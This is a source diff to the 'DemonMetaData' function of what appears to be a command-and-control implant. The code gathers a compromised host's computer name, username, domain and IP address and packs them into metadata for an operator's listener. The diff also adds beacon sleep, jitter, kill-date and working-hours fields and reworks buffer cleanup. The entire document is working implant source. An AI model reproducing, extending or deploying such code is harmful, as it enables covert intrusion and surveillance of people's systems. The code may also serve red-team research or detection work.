@@ -108,7 +108,6 @@ VOID DemonMetaData( PPACKAGE* MetaData, BOOL Header )
 
         /* Do not destroy this package if we fail to connect to the listener. */
         ( *MetaData )->Destroy = FALSE;
-        Instance.IsMetadataEncrypted = FALSE;
     }
 
     // create AES Keys/IV
@@ -148,6 +147,10 @@ VOID DemonMetaData( PPACKAGE* MetaData, BOOL Header )
         [ Elevated     ] 4 bytes
         [ OS Info      ] ( 5 * 4 ) bytes
         [ OS Arch      ] 4 bytes
+        [ SleepDelay   ] 4 bytes
+        [ SleepJitter  ] 4 bytes
+        [ Killdate     ] 8 bytes
+        [ WorkingHours ] 4 bytes
         ..... more
         [ Optional     ] Eg: Pivots, Extra data about the host or network etc.
     */
@@ -166,10 +169,14 @@ VOID DemonMetaData( PPACKAGE* MetaData, BOOL Header )
         {
             MemSet( Data, 0, Length );
             Instance.Win32.GetComputerNameExA( ComputerNameNetBIOS, Data, &Length );
+            PackageAddBytes( *MetaData, Data, Length );
+            DATA_FREE( Data, Length );
         }
+        else
+            PackageAddInt32( *MetaData, 0 );
     }
-    PackageAddBytes( *MetaData, Data, Length );
-    DATA_FREE( Data, Length );
+    else
+        PackageAddInt32( *MetaData, 0 );
 
     // Get Username
     Length = MAX_PATH;
@@ -177,10 +184,12 @@ VOID DemonMetaData( PPACKAGE* MetaData, BOOL Header )
     {
         MemSet( Data, 0, Length );
         Instance.Win32.GetUserNameA( Data, &Length );
+        PackageAddBytes( *MetaData, Data, Length );
+        DATA_FREE( Data, Length );
     }
+    else
+        PackageAddInt32( *MetaData, 0 );
 
-    PackageAddBytes( *MetaData, Data, Length );
-    DATA_FREE( Data, Length );
 
     // Get Domain
     Length = 0;
@@ -190,10 +199,14 @@ VOID DemonMetaData( PPACKAGE* MetaData, BOOL Header )
         {
             MemSet( Data, 0, Length );
             Instance.Win32.GetComputerNameExA( ComputerNameDnsDomain, Data, &Length );
+            PackageAddBytes( *MetaData, Data, Length );
+            DATA_FREE( Data, Length );
         }
+        else
+            PackageAddInt32( *MetaData, 0 );
     }
-    PackageAddBytes( *MetaData, Data, Length );
-    DATA_FREE( Data, Length );
+    else
+        PackageAddInt32( *MetaData, 0 );
 
     Instance.Win32.GetAdaptersInfo( NULL, &Length );
     if ( ( Adapter = Instance.Win32.LocalAlloc( LPTR, Length ) ) )
@@ -201,10 +214,7 @@ VOID DemonMetaData( PPACKAGE* MetaData, BOOL Header )
         if ( Instance.Win32.GetAdaptersInfo( Adapter, &Length ) == NO_ERROR )
         {
             PackageAddBytes( *MetaData, Adapter->IpAddressList.IpAddress.String, 16 );
-
-            MemSet( Adapter, 0, Length );
-            Instance.Win32.LocalFree( Adapter );
-            Adapter = NULL;
+            DATA_FREE( Adapter, Length );
         }
         else
             PackageAddInt32( *MetaData, 0 );
